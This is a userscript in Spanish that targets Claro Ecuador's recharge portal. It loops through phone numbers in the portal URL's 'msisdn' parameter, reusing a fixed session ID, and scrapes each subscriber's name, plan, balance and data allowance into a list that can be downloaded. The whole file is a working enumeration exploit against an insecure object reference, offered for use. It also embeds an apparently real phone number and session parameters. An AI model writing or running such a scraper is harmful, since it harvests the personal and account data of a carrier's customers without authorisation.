// ==UserScript==
// @name       claronumbers
// @namespace  scrntprcrz@gmail.com
// @version   6.6.6
// @author      5a+an
// @description  indexa los numeros de claro. pd por si acaso este script es para uso didactico, no hice benchmark en ninguna de las funciones solo lo hice por diversion y listo ademas lo hice gratis por eso creo que solo es basura util, asi que  ♫ no controles mi forma de codear ♫ . 
// @match      http://*recargabam.miclaro.com.ec/*
// @copyright  2013+,5a+an
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js
// ==/UserScript==
//http://recargabam.miclaro.com.ec/redirect2/integracion_portal_ocs2.php/SESSIONID=ggsnd122.claro.com.ec;3535036281;1470;22802&SITEID=esteros-diam-vip.porta.com&RG=54&INST=2114?dest_url=www.youtube.com/watch?v=vVoqmUycbWA&msisdn=593997639367
$('head').html('<title></title>');
$('body').css({'background-color':'#262626','color':'#D1D1D1'}).html('<div style="width:600px;margin:0 auto;"><h3><div>Procesando: <b id="na"></b></div><div><b class="ne">0</b> numeros encontrados.</div></h3><ul id="l" style="background-color:#4B4B4B;height:320px; overflow-y:scroll;list-style:none;margin:0;padding:0;"></ul><div style="word-wrap:break-word;"><button id="caca">Detener</button><button id="pipi">Generar html</button><br/>Presiona el boton generar html y luego click derecho en este <a href="" target="_blank" id="down">enlace</a> y pones guardar enlace como y lo guardas como tu quieras y lo abres con chrome.</div></div>');
var s=document.URL;
var fg=m=k=hy=0;
function o(){
    
    if(k==0){
    var cn=(parseInt(s.split('msisdn=')[1])+1);
        fg=(fg==0)?cn:fg;
    $('#na').html(cn);
    s='http://recargabam.miclaro.com.ec/redirect2/integracion_portal_ocs2.php/SESSIONID=ggsnd122.claro.com.ec;3535036281;1470;22802&SITEID=esteros-diam-vip.porta.com&RG=54&INST=2114?dest_url=www.youtube.com/watch?v=vVoqmUycbWA&msisdn='+cn;
    //$('.si').html(s);
    $.ajax({
        url: s,
        cache: false
    }).done(function(a) {
        var h=$(a);
        var i=h.find('#idservicio').val();
        if(typeof i!='undefined'){
            var e=$('#'+i);
            if(e.length==0){
               m++;
              $('title').html(m+' numeros');
              $('.ne').html(m);
              $('#l').append('<li style="cursor:pointer;padding:8px 12px;"id="'+i+'">0'+i+' - '+h.find('.nombre:eq(0)').html().substring(14)+'</li>');
            }
        	o();
        }else o();
    });  
    }
    if(k==2){
        $('#caca').html('Continuar');
        k=1;
    }
    	
    
        
    
}
o();

$(document).on('click','#caca',function(){
    var t=$(this);
    if(k==0){
        t.html('Deteniendo...');
        k=2;
    }else if(k==1){
        t.html('Detener');
        k=0;
        o();
    }
});

$(document).on('click','li',function(){
   // $('.bs').remove();
 	var t=$(this);
    if(t.find('.bs').length>0){
    	t.css('background-color','#4B4B4B').find('.bs').remove();
    }else{
        	$('.bs').parent().css('background-color','#4B4B4B');
            $('.bs').remove();
        	t.css('background-color','#009999').append('<div class="bs" style="margin:3px 0 0 5px;">Cargando...</div>');
        	console.log();
        	$.ajax({
        		url: 'http://recargabam.miclaro.com.ec/redirect2/integracion_portal_ocs2.php/SESSIONID=ggsnd122.claro.com.ec;3535036281;1470;22802&SITEID=esteros-diam-vip.porta.com&RG=54&INST=2114?dest_url=www.youtube.com/watch?v=vVoqmUycbWA&msisdn=593'+t.attr('id'),
        		cache: false
            }).done(function(a){
                var h=$(a);
                t.find('.bs').html('<b>Plan: </b>'+h.find('.plan:eq(0)').html().toLowerCase()+' · <b>Saldo: </b>'+h.find('#saldodisponible').val()+' · <b>Paquete disponible: </b>'+h.find('#cupomb').val())
            });
        	
        }
});




$(document).on('click','#pipi',function(){
	if(k==1){
    var ty='Si quieres iniciar donde te quedaste click <a target="_blank" href="'+s;
        ty+='">aqui</a><br/>Lista de numeros desde el '+fg+' hasta el '+$('#na').html()+' con '+m+' numeros encontrados<br/><br/>';
    	$('li').each(function(index){
  			ty+=$(this).html()+'<br/>';
		});
        var blob = new Blob([ty], {type: 'text/html'});
        var url = (window.webkitURL || window.URL).createObjectURL(blob);
        $('#down').attr('href',url);
        alert('Archivo generado con exito')
 		//window.open(url, '_blank'); 
    }else{
        alert('Primero tienes que detener la busqueda.');
    }
  
});